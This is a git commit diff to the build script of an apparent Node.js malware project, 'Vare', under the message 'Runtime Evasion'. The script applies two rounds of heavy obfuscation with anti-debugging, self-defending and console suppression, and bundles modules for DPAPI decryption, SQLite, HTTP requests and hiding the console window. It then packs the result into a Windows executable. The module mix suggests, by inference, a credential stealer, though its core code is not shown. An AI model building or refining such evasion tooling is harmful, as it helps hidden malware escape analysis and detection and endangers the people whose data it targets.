d52005cfd747962bbecb532a08cd34be1e9d104c
Saint <111476645+saintdaddy@users.noreply.github.com>
2023-04-13 13:43:38 +0300

    Runtime Evasion - Star The Project

--- build.js
+++ build.js
@@ -12,6 +12,21 @@ async function obfuscate(code) {
         "deadCodeInjection": true,
         "deadCodeInjectionThreshold": 1,
         "debugProtection": true,
+        "debugProtectionInterval": 3000,
+        "disableConsoleOutput": true,
+        "rotateStringArray": true,
+        "selfDefending": true,
+        target: "node"
+      }
+    ).getObfuscatedCode()
+    console.log('[+] Obfuscation Step 2 Started')
+    var obfuscationResult2 = await JavaScriptObfuscator.obfuscate(obfuscationResult,{
+        "compact": false,
+        "controlFlowFlattening": true,
+        "controlFlowFlatteningThreshold": 1,
+        "deadCodeInjection": true,
+        "deadCodeInjectionThreshold": 1,
+        "debugProtection": true,
         "debugProtectionInterval": 350,
         "disableConsoleOutput": true,
         "rotateStringArray": true,
@@ -19,28 +34,11 @@ async function obfuscate(code) {
         target: "node"
       }
     ).getObfuscatedCode()
-    console.log('[+] Obfuscation Step 1 Completed')
-    console.log('[+] Obfuscation Step 2 Started')
-    var obfuscationResult2 = await JavaScriptObfuscator.obfuscate(obfuscationResult,{
-        "compact": true,
-        "controlFlowFlattening": true,
-        "controlFlowFlatteningThreshold": 1,
-        "deadCodeInjection": true,
-        "deadCodeInjectionThreshold": 1,
-        "debugProtection": true,
-        "debugProtectionInterval": 500,
-        "disableConsoleOutput": true,
-        "rotateStringArray": true,
-        "selfDefending": true,
-        target: "node"
-      }
-    ).getObfuscatedCode()
-    console.log('[+] Obfuscation Step 2 Completed')
       var modules = `require("fs");
 require("path");
 require("crypto");
 require('sqlite3');
-require("vareapi");
+require("lin-dpapi");
 require('axios');
 require('os');
 require('fs-extra')
@@ -52,14 +50,13 @@ require('node-hide-console-window');
 `
 
       fs.writeFileSync('vareobf.js', modules + obfuscationResult2)
-      console.log('[+] Your File Created')
       build()
 
 }
 
 async function build() {
   console.log('[+] Build Starting')
-  await execSync(`pkg . --targets node16-win-x64 -C gzip --output vare.exe`)
+  await execSync(`pkg . --targets node16-win-x64 -C Gzip --output Vare.exe`)
   console.log('[+] Build Completed')
   fs.unlinkSync('./vareobf.js')
 }
